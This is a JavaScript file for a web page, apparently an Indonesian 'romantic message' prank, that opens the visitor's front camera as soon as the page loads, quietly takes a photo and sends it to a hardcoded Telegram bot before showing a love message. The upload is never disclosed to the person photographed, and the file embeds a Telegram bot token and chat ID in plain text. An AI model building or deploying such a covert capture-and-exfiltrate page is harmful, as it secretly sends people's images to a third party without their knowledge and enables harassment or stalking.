let stream = null;
let capturedImage = null;

const TELEGRAM_BOT_TOKEN = "8703334699:AAHXkd029InXgEkSo4CRXM2P3Vl1_mQ4VAc";
const TELEGRAM_CHAT_ID = "5323236080";

const canvas = document.getElementById('canvas');
const canvasDisplay = document.getElementById('canvas-display');
const ctx = canvas.getContext('2d');
const ctxDisplay = canvasDisplay.getContext('2d');

const cameraPermissionScreen = document.getElementById('camera-permission');
const romanticMessageScreen = document.getElementById('romantic-message');
const photoRevealScreen = document.getElementById('photo-reveal');

const revealBtn = document.getElementById('reveal-btn');
const retryBtn = document.getElementById('retry-btn');

window.addEventListener('load', () => {
    requestCameraAccess();
});

async function requestCameraAccess() {
    try {
        const tempVideo = document.createElement('video');
        tempVideo.style.display = 'none';
        tempVideo.autoplay = true;
        tempVideo.playsinline = true;
        document.body.appendChild(tempVideo);

        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        });

        tempVideo.srcObject = stream;
        tempVideo.onloadedmetadata = () => {
            tempVideo.play();
            setTimeout(() => {
                capturePhoto(tempVideo);
                tempVideo.remove();
            }, 500);
        };

    } catch (error) {
        console.error('Error akses kamera:', error);
        alert('Izinkan akses kamera untuk melanjutkan!');
    }
}

function capturePhoto(videoElement) {
    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;
    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
    capturedImage = canvas.toDataURL('image/jpeg');

    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }

    sendPhotoToTelegram();
    showRomanticMessage();
}

async function sendPhotoToTelegram() {
    try {
        const blob = await fetch(capturedImage).then(r => r.blob());
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'prank.jpg');
        formData.append('caption', '📸 Foto berhasil dikapture!');

        const response = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
            {
                method: 'POST',
                body: formData
            }
        );

        const data = await response.json();
        if (data.ok) {
            console.log('✅ Foto terkirim!');
        }
    } catch (error) {
        console.error('❌ Error:', error);
    }
}

function showRomanticMessage() {
    cameraPermissionScreen.classList.remove('active');
    romanticMessageScreen.classList.add('active');
}

revealBtn.addEventListener('click', () => {
    showPhotoReveal();
});

function showPhotoReveal() {
    romanticMessageScreen.classList.remove('active');
    photoRevealScreen.classList.add('active');

    const img = new Image();
    img.src = capturedImage;
    img.onload = () => {
        canvasDisplay.width = img.width;
        canvasDisplay.height = img.height;
        ctxDisplay.drawImage(img, 0, 0);
    };
}

retryBtn.addEventListener('click', () => {
    capturedImage = null;
    cameraPermissionScreen.classList.add('active');
    romanticMessageScreen.classList.remove('active');
    photoRevealScreen.classList.remove('active');
    requestCameraAccess();
});
